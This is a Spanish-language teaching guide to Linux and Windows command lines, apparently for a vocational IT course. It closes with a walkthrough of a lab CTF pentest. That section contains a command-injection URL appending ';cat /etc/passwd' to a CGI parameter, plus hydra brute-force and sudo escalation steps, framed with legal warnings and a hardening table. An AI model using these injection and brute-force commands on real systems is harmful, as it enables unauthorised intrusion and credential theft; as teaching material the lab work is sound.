# Comandos de Linux y PowerShell

Guía práctica de comandos para los dos sistemas que se usan en el módulo: **Linux** (Ubuntu/Kali con Bash) y **Windows** (CMD y PowerShell). Está ordenada de lo más fácil a lo más avanzado, cada comando viene explicado y, al final, hay un caso real de auditoría completo.

> **Cómo leerla:** los primeros bloques son navegación y archivos (lo básico de cada día); luego procesos, usuarios, permisos y red; después scripting en Bash y PowerShell; y al final transferencia segura, cifrado y un pentest paso a paso.

---

## 0. Antes de empezar: dos mundos, misma lógica

| Idea | Linux (Bash) | Windows |
|---|---|---|
| Intérprete | `bash`, `zsh`, `sh` | CMD (clásico) y **PowerShell** (moderno) |
| Sensible a mayúsculas | **Sí** (`Archivo.txt` ≠ `archivo.txt`) | No |
| Qué devuelve | **texto** | CMD: texto · **PowerShell: objetos** |
| Separador de rutas | `/` (`/home/user`) | `\` (`C:\Users`) |
| Administrador | `sudo <comando>` | "Ejecutar como administrador" |

> **La gran diferencia de PowerShell:** no trabaja con texto, sino con **objetos**. Eso cambia cómo se filtra y se encadena. Muchos "comandos Unix" (`ls`, `cat`, `rm`) existen en PowerShell, pero son **alias** de un cmdlet real (`Get-ChildItem`, `Get-Content`, `Remove-Item`). Para ver qué ejecutas de verdad: `Get-Command ls`.

En Linux **todo es un archivo** (dispositivos, directorios, procesos) y el sistema se organiza como un árbol que cuelga de la raíz `/`:

| Directorio | Qué contiene |
|---|---|
| `/` | La raíz de todo |
| `/bin` `/sbin` | Binarios básicos / de administración |
| `/home` | Carpetas personales de los usuarios |
| `/root` | Carpeta personal del superusuario |
| `/etc` | Archivos de configuración |
| `/var` | Datos variables (logs, colas) |
| `/tmp` | Temporales |
| `/usr` | Aplicaciones y librerías |

## 1. Navegar y ver dónde estás

| Tarea | Linux | CMD | PowerShell |
|---|---|---|---|
| Dónde estoy | `pwd` | `cd` | `Get-Location` (`pwd`) |
| Cambiar de carpeta | `cd ruta` | `cd ruta` | `Set-Location` (`cd`) |
| Listar | `ls` | `dir` | `Get-ChildItem` (`ls`, `dir`) |

```bash
pwd                 # print working directory: ruta absoluta donde estás
cd /home/alumno     # ir a una ruta absoluta (empieza por /)
cd docs             # ruta relativa: a partir de donde estás
cd ..               # subir un nivel
cd ~                # ir a tu carpeta personal ($HOME)
ls -l               # listado largo (permisos, dueño, tamaño, fecha)
ls -a               # incluye ocultos (los que empiezan por .)
ls -lh              # tamaños legibles (K, M, G)
tree /etc           # dibuja el árbol de carpetas
```

> **Ruta absoluta vs relativa:** la absoluta empieza en `/` y funciona desde cualquier sitio (`/home/alumno/docs`); la relativa parte de donde estás (`../docs` sube uno y entra en docs).

En Windows:

```powershell
Get-ChildItem                      # listar (alias ls / dir)
Get-ChildItem -Force               # incluir ocultos y de sistema
Get-ChildItem -Directory | Sort-Object Name     # solo carpetas, ordenadas
Get-ChildItem -Recurse -Filter *.log -ErrorAction SilentlyContinue  # buscar recursivo
```

- `-Recurse` entra en subcarpetas, `-Force` muestra ocultos, `-ErrorAction SilentlyContinue` evita que un error de permisos rompa el listado.

## 2. Crear, copiar, mover y borrar

| Tarea | Linux | CMD | PowerShell |
|---|---|---|---|
| Crear carpeta | `mkdir` | `md` / `mkdir` | `New-Item -ItemType Directory` |
| Crear archivo vacío | `touch` | `type nul >` | `New-Item -ItemType File` |
| Copiar | `cp` | `copy`/`xcopy`/`robocopy` | `Copy-Item` |
| Mover / renombrar | `mv` | `move` | `Move-Item` |
| Borrar | `rm` | `del` | `Remove-Item` |

### Linux

```bash
mkdir proyectos                 # crear carpeta
mkdir -p proyectos/linux/bash   # -p crea también los padres que falten
touch notas.txt                 # crea archivo vacío (o actualiza su fecha)
cp archivo.txt copia.txt        # copiar (el original se queda)
mv archivo.txt Descargas/       # mover
mv viejo.txt nuevo.txt          # renombrar (mover en la misma carpeta)
rm archivo.txt                  # borrar archivo (¡sin papelera!)
rmdir carpeta_vacia             # borrar carpeta SOLO si está vacía (seguro)
rm -rf carpeta/                 # borrar carpeta y todo su contenido (¡peligro!)
```

> **`rmdir` vs `rm -rf`:** `rmdir` solo borra carpetas vacías, así que si te equivocas, falla y no pierdes nada. `rm -rf` arrasa sin preguntar: úsalo con la mano temblando.
>
> **Truco de Kali (expansión de llaves):** `mkdir -p ~/orion/{evidencias,logs,backup}` crea las tres carpetas de golpe.

### Windows

```powershell
New-Item -ItemType Directory -Path .\Logs
New-Item -ItemType File -Path .\Logs\app.log -Force
Copy-Item .\Logs -Destination .\Backup -Recurse -Force
Remove-Item .\Backup -Recurse -Force -WhatIf   # -WhatIf SIMULA: enseña qué haría sin borrar
```

> **`-WhatIf` es tu red de seguridad** en PowerShell: muestra qué pasaría sin ejecutarlo. Para copias serias en CMD, **`robocopy`** es la mejor (`robocopy C:\datos D:\backup /MIR /MT:8` hace copia espejo multihilo).

## 3. Ver y buscar dentro de archivos

| Tarea | Linux | CMD | PowerShell |
|---|---|---|---|
| Ver todo | `cat` | `type` | `Get-Content` (`cat`) |
| Primeras/últimas líneas | `head` / `tail` | — | `-TotalCount` / `-Tail` |
| Seguir en vivo | `tail -f` | — | `Get-Content -Wait` |
| Buscar texto | `grep` | `findstr` | `Select-String` (`sls`) |

### Linux

```bash
cat notas.txt              # imprime el archivo entero (para archivos cortos)
head -n 5 registro.log     # primeras 5 líneas
tail -n 10 registro.log    # últimas 10 líneas
tail -f registro.log       # seguimiento EN VIVO (ideal para logs)
less archivo_largo.txt     # paginado: subir/bajar, buscar con / , salir con q
grep -i error registro.log # busca "error" ignorando mayúsculas (-i)
grep -r localhost backup/  # búsqueda recursiva en una carpeta (-r)
grep -c error registro.log # cuenta cuántas líneas coinciden (-c)
find /home -name "*.txt"   # busca archivos por nombre de forma recursiva
```

> Combinaciones muy típicas: `-i` (ignora mayúsculas), `-r` (recursivo), `-n` (número de línea), `-c` (cuenta).

### Windows (PowerShell)

```powershell
Get-Content .\app.log -TotalCount 20     # primeras 20 (head)
Get-Content .\app.log -Tail 50           # últimas 50 (tail)
Get-Content .\app.log -Tail 20 -Wait     # tail -f
Select-String -Path .\app.log -Pattern "error|fail" -AllMatches   # grep con regex
Select-String -Path .\app.log -Pattern "timeout" -Context 2,2     # 2 líneas antes y después
```

> `Select-String` no devuelve texto, devuelve **objetos** (`MatchInfo`), así que puedes seguir filtrando: `Select-String ... | Group-Object Path | Select-Object Name, Count` cuenta coincidencias por archivo.

## 4. Redirección y tuberías (el superpoder de la terminal)

Tres operadores que hay que dominar, iguales en Linux y Windows:

| Operador | Qué hace |
|---|---|
| `>` | Manda la salida a un archivo, **sobrescribiendo** |
| `>>` | Manda la salida a un archivo, **añadiendo** al final |
| `|` | Pasa la salida de un comando como **entrada** del siguiente (tubería) |

```bash
whoami > usuario.txt        # guarda tu usuario (borra lo que hubiera)
date >> usuario.txt         # añade la fecha al final (no borra)
ls /etc | grep -i ssh       # lista /etc y se queda solo con lo que tenga "ssh"
grep -i error registro.log | wc -l   # cuenta las líneas con error (wc -l = contar líneas)
ps aux | grep sleep         # lista procesos y filtra el que te interesa
```

> La tubería `|` conecta la **salida estándar (stdout)** de un comando con la **entrada estándar (stdin)** del siguiente. Es la base de encadenar herramientas pequeñas para hacer cosas grandes.

En PowerShell la tubería pasa **objetos**, no texto, lo que es más potente:

```powershell
Get-ChildItem C:\Temp -File | Where-Object { $_.Length -gt 1MB }   # archivos de más de 1 MB
```

## 5. Procesos y sistema

| Tarea | Linux | CMD | PowerShell |
|---|---|---|---|
| Ver procesos | `ps aux` / `top` | `tasklist` | `Get-Process` |
| Matar proceso | `kill PID` | `taskkill /PID` | `Stop-Process -Id` |
| Info del sistema | `uname -a` | `systeminfo` | `Get-ComputerInfo` |

### Linux

```bash
ps aux                 # todos los procesos (estilo BSD: a=todos, u=con CPU/mem, x=sin terminal)
ps aux | grep firefox  # filtrar un proceso concreto
top                    # monitor en vivo por consumo de CPU (salir con q)
htop                   # versión interactiva y más cómoda (si está instalada)
kill 1234              # pide al proceso que termine (señal SIGTERM / 15, educada)
kill -9 1234           # lo fuerza (SIGKILL / 9) — último recurso
uname -a               # info del kernel y sistema
```

> **`kill` normal vs `kill -9`:** `kill 1234` envía SIGTERM, una petición ordenada de cerrar y limpiar. `kill -9` (SIGKILL) corta en seco; úsalo solo si el proceso no responde.

### Windows

```powershell
Get-Process                      # procesos (PowerShell, como objetos)
tasklist | find "chrome"         # CMD: filtrar por texto
taskkill /PID 1234 /F            # CMD: matar por PID (/F = forzar)
Stop-Process -Id 1234            # PowerShell equivalente
systeminfo | find "Memory"       # CMD: info del sistema filtrada
sc query                         # CMD: ver servicios
sc stop spooler                  # CMD: detener la cola de impresión
```

## 6. Usuarios, grupos y permisos

### 6.1. Linux: permisos rwx

```bash
whoami                         # quién soy
passwd                         # cambiar mi contraseña
sudo chown alumno:alumno f.txt # cambiar propietario (dueño:grupo)
chmod 755 script.sh            # permisos por números
chmod u+x script.sh            # dar ejecución (x) al usuario (u)
```

> **Los permisos `755`:** cada dígito es un conjunto (dueño / grupo / otros) y suma **r=4, w=2, x=1**. Así `7` = rwx (4+2+1), `5` = r-x (4+1). `755` = el dueño puede todo, los demás leen y ejecutan.

### 6.2. Windows: usuarios (CMD y PowerShell)

```powershell
# CMD clásico
net user                               # ver usuarios
net user marco MiPass123 /add          # crear usuario
net localgroup administrators marco /add  # hacerlo administrador
net user marco /active:no              # deshabilitar (no puede iniciar sesión)
net user marco /delete                 # borrar

# PowerShell (como objetos, mejor control)
Get-LocalUser | Select-Object Name, Enabled, LastLogon
New-LocalUser -Name "alumno02" -Password (Read-Host "Pass" -AsSecureString)
Disable-LocalUser -Name "alumno02"
New-LocalGroup -Name "AlumnosSMR" -Description "Prácticas"
Add-LocalGroupMember -Group "AlumnosSMR" -Member "alumno02"
```

### 6.3. Permisos en Windows: ACL (equivalente a chmod/chown)

Windows no usa rwx sino **ACL** (listas de control de acceso). La herramienta de CMD es `icacls`:

```powershell
icacls C:\carpeta                              # ver permisos
icacls C:\Aula\Practicas /grant "AlumnosSMR:(OI)(CI)M"   # dar Modify a un grupo
icacls C:\Aula\Practicas /inheritance:d        # quitar herencia manteniendo permisos
icacls C:\carpeta /reset                       # restaurar permisos por defecto
```

> `M` = Modify (modificar), `F` = control total. `(OI)(CI)` propaga a archivos (Object Inherit) y subcarpetas (Container Inherit). En PowerShell `Get-Acl` / `Set-Acl` hacen lo mismo con objetos.

## 7. Red y conectividad

| Tarea | Linux | CMD | PowerShell |
|---|---|---|---|
| Ver IPs | `ip a` | `ipconfig /all` | `Get-NetIPAddress` |
| Rutas | `ip route` | `route print` | `Get-NetRoute` |
| Probar conexión | `ping` | `ping` | `Test-Connection` |
| Resolver DNS | `dig` / `nslookup` | `nslookup` | `Resolve-DnsName` |
| Puertos/conexiones | `ss -tulnp` | `netstat -ano` | `Get-NetTCPConnection` |

### Linux

```bash
ip a                 # todas las interfaces y direcciones (abreviado de 'ip address show')
ip -br a             # resumen breve: una línea por interfaz
ip route             # tabla de rutas (la 'default via...' es el router)
ip a show eth0       # solo una interfaz
ping -c 4 google.com # 4 pings y para (sin -c sigue indefinidamente)
```

### Windows

```powershell
ipconfig /all        # CMD: toda la info de red
ipconfig /renew      # renovar IP por DHCP
netstat -ano         # CMD: conexiones con PID (-a escucha, -n sin DNS, -o PID)
Get-NetTCPConnection | Select-Object LocalAddress, LocalPort, RemoteAddress, RemotePort, State, OwningProcess
```

> **Localizar qué proceso ocupa un puerto** (PowerShell): `Get-NetTCPConnection -LocalPort 8080` da el `OwningProcess` (PID), y `Get-Process -Id <PID>` te dice qué programa es.

### Nmap: descubrir y escanear (Kali)

```bash
nmap -sn 192.168.56.0/24        # ping scan: qué hosts están vivos (sin escanear puertos)
nmap -sV -p 22,80,443 localhost # escanea esos puertos e intenta detectar servicio y versión
nmap -O 192.168.56.10           # intenta identificar el sistema operativo
```

| Opción | Qué hace |
|---|---|
| `-sn` | Solo descubre hosts, no escanea puertos |
| `-sV` | Detecta servicio y **versión** de cada puerto abierto |
| `-p` | Elige puertos (`-p-` = los 65535) |
| `-O` | Adivina el sistema operativo |

> **¡Ojo, legal!** Escanea **solo** redes de laboratorio o con autorización expresa por escrito. Ni ser admin ni usar `sudo` sustituyen al permiso del dueño de la red. Hacerlo en redes ajenas tiene consecuencias legales.

## 8. Scripting en Bash

Un script empieza con el *shebang* `#!/bin/bash` y se le da permiso de ejecución con `chmod u+x`.

```bash
#!/bin/bash
# Comentario
echo "Mi primer script"
```

### Condicionales

```bash
if [ -f archivo.txt ]; then      # -f: ¿existe el archivo?
  echo "Existe"
else
  echo "No existe"
fi

if [ "$1" -gt 10 ]; then         # $1 es el primer argumento; -gt = mayor que
  echo "Mayor que 10"
elif [ "$1" -eq 10 ]; then       # -eq = igual
  echo "Igual a 10"
else
  echo "Menor que 10"
fi
```

> Comparadores numéricos de Bash: `-eq` (igual), `-ne` (distinto), `-gt` (mayor), `-ge` (mayor o igual), `-lt` (menor), `-le` (menor o igual). Para archivos: `-f` (es archivo), `-d` (es directorio).

### Bucles y funciones

```bash
for i in 1 2 3 4 5; do           # recorrer una lista
  echo "Número $i"
done

for archivo in *.txt; do         # recorrer los .txt de la carpeta
  echo "Archivo: $archivo"
done

contador=1
while [ $contador -le 5 ]; do     # mientras se cumpla la condición
  echo "Contador: $contador"
  ((contador++))
done

case $opcion in                   # según el valor (como un menú)
  1) echo "Opción 1";;
  2) echo "Opción 2";;
  *) echo "No válida";;
esac

function suma() {                 # función con retorno
  echo $(($1 + $2))
}
resultado=$(suma 3 4)             # captura la salida en una variable
echo "Resultado: $resultado"
```

## 9. Scripting en PowerShell

PowerShell trabaja con objetos y sus operadores son distintos a los de Bash.

### Condicionales y switch

```powershell
$nota = 6.5
if ($nota -ge 9) { "Sobresaliente" }
elseif ($nota -ge 5) { "Aprobado" }
else { "Suspenso" }
```

> Operadores PowerShell: `-eq -ne -gt -ge -lt -le` (números), `-like` (comodines), `-match` (regex), `-contains` (en colecciones). Por defecto el texto **no** distingue mayúsculas; usa `-ceq` / `-cmatch` si quieres que sí.

```powershell
switch -Regex ($ip) {                     # clasificar una IP por regex
  '^10\.'        { "Red privada 10.0.0.0/8" }
  '^192\.168\.'  { "Red privada 192.168.0.0/16" }
  default        { "No es una privada típica" }
}
```

### Bucles, funciones y errores

```powershell
for ($i = 1; $i -le 20; $i++) {
  "alumno{0:d2}" -f $i            # {0:d2} rellena con ceros: alumno01, alumno02...
}

Get-ChildItem C:\Temp -File | ForEach-Object {   # $_ es el objeto actual de la tubería
  "{0} => {1} bytes" -f $_.Name, $_.Length
}

function Test-Puerto {
  param(
    [Parameter(Mandatory)][string]$Equipo,
    [Parameter(Mandatory)][ValidateRange(1,65535)][int]$Port
  )
  $r = Test-NetConnection -ComputerName $Equipo -Port $Port -WarningAction SilentlyContinue
  [pscustomobject]@{ Equipo=$Equipo; Port=$Port; Abierto=$r.TcpTestSucceeded }
}
Test-Puerto -Equipo "server01" -Port 3389
```

> `[ValidateRange(1,65535)]` bloquea puertos imposibles antes de ejecutar. `[pscustomobject]` crea una salida estructurada, perfecta para exportar a CSV.

```powershell
try   { Get-ChildItem "C:\NoExiste" -ErrorAction Stop }   # Stop convierte el error en excepción
catch { "ERROR: $($_.Exception.Message)" }
finally { "Esto se ejecuta siempre" }
```

## 10. Firewall y directivas (Windows)

```powershell
Get-NetFirewallProfile | Select-Object Name, Enabled   # estado de los perfiles
Set-NetFirewallProfile -Profile Domain,Private,Public -Enabled True   # activar el firewall

# Crear regla: permitir RDP entrante solo en red privada
New-NetFirewallRule -DisplayName "Permitir RDP (Privado)" `
  -Direction Inbound -Protocol TCP -LocalPort 3389 -Action Allow -Profile Private
```

Ejecución de scripts (muy preguntado):

```powershell
Get-ExecutionPolicy -List
Set-ExecutionPolicy -Scope CurrentUser -ExecutionPolicy RemoteSigned
Unblock-File .\script.ps1       # quita la marca de "descargado de Internet" (MOTW)
```

> `RemoteSigned` permite scripts locales sin firmar pero exige firma a los descargados de Internet. Es el equilibrio habitual en aula/lab. `gpupdate /force` aplica directivas de grupo; `gpresult /h informe.html` genera el informe.

## 11. Transferencia segura e integridad (SCP y hashes)

**SCP** copia archivos entre equipos **a través de SSH**, así que ya va cifrado:

```bash
scp informe.txt usuario@192.168.1.10:/home/usuario/envios/   # subir al remoto
scp usuario@192.168.1.10:/home/usuario/envios/remoto .       # bajar (. = carpeta actual)
scp -P 22222 usuario@host:/ruta/archivo .                    # -P elige puerto SSH (ojo: P mayúscula)
```

Para comprobar que el archivo no se alteró en el camino, se usa su **hash**:

```bash
sha256sum informe.txt > huella.sha256   # calcular y guardar la huella
sha256sum -c huella.sha256              # en el receptor: verificar ("OK" si coincide)
```

> Misma idea que en los repasos de incidentes: si cambia un solo bit, el SHA-256 cambia. Es como se demuestra la integridad de una evidencia o de un envío.

## 12. Cifrado con GPG

**GPG** cifra archivos de dos formas: con contraseña (simétrico) o con par de claves (asimétrico).

### Simétrico (misma contraseña para cifrar y descifrar)

```bash
gpg --symmetric --cipher-algo AES256 --output informe.cifrado informe.txt   # cifrar
gpg --output informe.txt --decrypt informe.cifrado                          # descifrar (pide la clave)
gpgconf --kill gpg-agent    # borra la contraseña cacheada para que vuelva a pedirla
```

### Asimétrico (par de claves: pública para cifrar, privada para descifrar)

```bash
# 1) El receptor genera su par de claves
gpg --quick-generate-key "Receptor rodrigo-5022" default default 1y
gpg --list-keys            # ver claves públicas
gpg --list-secret-keys     # ver claves privadas
gpg --fingerprint          # ver la huella (para verificarla)

# 2) El receptor exporta su clave PÚBLICA y se la pasa al emisor
gpg --armor --export "Receptor rodrigo-5022" > clave.asc

# 3) El emisor la verifica e importa
gpg --show-keys --with-fingerprint clave.asc   # ver la huella SIN importar
gpg --import clave.asc

# 4) El emisor cifra con la pública del receptor
gpg --encrypt --recipient "Receptor rodrigo-5022" --output informe.cif informe.txt

# 5) Solo el receptor descifra, con su clave PRIVADA
gpg --output informe.txt --decrypt informe.cif
```

> **Flujo completo:** el receptor genera claves → exporta su pública → el emisor la importa → cifra con ella → envía por `scp` → el receptor descifra con su privada.
>
> **Dos avisos importantes:** (1) **nunca** compartas la clave privada; para respaldarla, `gpg --armor --export-secret-keys "nombre" > privada.asc` y guárdala a buen recaudo. (2) Antes de importar una clave pública, **compara su huella** con la que te dé el dueño por otro canal, para no importar una falsa. Si el nombre lleva espacios, va entre comillas.

## 13. Caso práctico avanzado: auditoría de un servidor (pentest)

Todo lo anterior junto, en una auditoría real contra una máquina de laboratorio (CTF *boot2root*). Las fases son las clásicas de un pentest: **reconocimiento → explotación → acceso → movimiento lateral → escalada de privilegios**.

### Fase 1 · Reconocimiento

```bash
sudo netdiscover -r 192.168.210.0/24   # localizar la IP de la víctima en la red
nmap -p- -sV 192.168.210.120           # escanear LOS 65535 puertos + versiones
```

> El escaneo por defecto de nmap solo mira los 1000 puertos comunes. **`-p-`** los recorre todos: por eso aparecen servicios escondidos en puertos altos (el SSH de verdad estaba en el 22222, no en el 22, que era un cebo).

### Fase 2 · Explotación de servicios expuestos

```bash
nc 192.168.210.120 13337     # netcat conecta "a pelo" a un puerto y lee lo que escupe (banner)
ftp 192.168.210.120          # FTP mal configurado: login anónimo (usuario anonymous, sin pass)
```

> **Netcat (`nc`)** abre una conexión TCP cruda: útil para leer banners o caer en shells mal protegidas. El FTP anónimo y los paneles web sin auth (Cockpit en el 9090) regalan información.

### Fase 3 · Enumeración web e inyección de comandos

```bash
# robots.txt lista rutas que el admin no quiere indexar: oro para el atacante
http://victima/robots.txt        →  revela /passwords/

# CGI que no filtra la entrada → inyección de comandos con ;
http://victima/cgi-bin/tracertool.cgi?ip=127.0.0.1;cat /etc/passwd
```

> **Inyección de comandos:** el script esperaba una IP para un `traceroute`, pero al no validar la entrada, añadir `;cat /etc/passwd` hace que el servidor ejecute **los dos** comandos. Así se sacó la lista de usuarios reales.

### Fase 4 · Acceso por SSH (reutilización de credenciales)

```bash
ssh Summer@192.168.210.120 -p 22222   # usuario + contraseña deducidos en la fase anterior
more FLAG.txt                         # 'cat' estaba saboteado; se lee con more/less/tac
```

### Fase 5 · Movimiento lateral (secretos escondidos)

```bash
scp -P 22222 Summer@victima:/home/Morty/Safe_Password.jpg .   # exfiltrar a Kali
strings Safe_Password.jpg | grep -i pass    # extraer texto del JPG → la contraseña del ZIP
unzip journal.txt.zip                        # abrir el ZIP con esa contraseña
```

> **`strings`** saca las cadenas de texto legibles de cualquier archivo (una imagen, un binario). Es como se encuentran secretos guardados en texto plano donde no deberían estar.

### Fase 6 · Escalada a root (OSINT + diccionario + fuerza bruta)

```bash
# 1) Diccionario a medida con el patrón deducido (mayúscula + dígito + palabra)
crunch 7 7 -t ,%Flesh -o dicc.txt
# 2) Fuerza bruta contra el SSH real
hydra -l RickSanchez -P dicc.txt ssh://192.168.210.120 -s 22222 -t 4
# 3) Ya dentro, comprobar privilegios y escalar
sudo -l        # muestra qué puede ejecutar el usuario como root
sudo su        # si puede ejecutar cualquier cosa sin contraseña → shell de root
```

> **`crunch`** genera el diccionario siguiendo un patrón, **`hydra`** lo prueba contra el servicio, y **`sudo -l`** revela permisos sudo demasiado amplios: la vía de escalada más común.

### Lo que enseña para bastionar

| Fallo encontrado | Cómo se bastiona |
|---|---|
| Puertos y banners expuestos | Cortafuegos (ufw/iptables), cerrar lo que no se usa, ocultar banners |
| FTP anónimo y servicios sin auth | Desactivar login anónimo, quitar backdoors |
| Inyección de comandos en CGI | Validar siempre la entrada, deshabilitar CGI inseguro |
| Contraseñas débiles reutilizadas | Política de contraseñas fuertes y autenticación por **clave SSH** |
| Secretos en texto plano / metadatos | No guardar secretos en claro, mínimo privilegio |
| `sudo` demasiado permisivo | Auditar `/etc/sudoers` y restringir qué comandos se permiten |

## Resumen en una frase

Linux (Bash) y Windows (CMD/PowerShell) hacen lo mismo con sintaxis distinta: **navegar y gestionar archivos**, **ver y buscar texto** con tuberías, **controlar procesos, usuarios, permisos y red**, y **automatizar** con scripts; sobre esa base se añade **transferencia segura (SCP), integridad (hash), cifrado (GPG)** y, juntándolo todo, una **auditoría completa** desde el reconocimiento hasta root.
